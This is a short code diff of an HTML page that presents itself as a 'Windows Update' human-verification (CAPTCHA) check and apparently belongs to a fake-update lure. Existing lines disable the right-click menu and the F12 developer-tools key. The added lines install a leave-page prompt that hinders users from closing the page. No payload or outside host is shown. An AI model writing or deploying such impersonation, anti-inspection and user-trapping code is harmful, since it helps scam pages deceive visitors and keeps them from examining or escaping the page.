@@ -4,6 +4,9 @@
 <head>
     <title>Windows Update 人机验证</title>
     <script>
+            let hasUnsaved = true;
+    document.addEventListener('input', () => hasUnsaved = true);
+    window.onbeforeunload = () => hasUnsaved ? '' : void 0;
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('keydown', e => {
             if (e.key === 'F12') e.preventDefault();
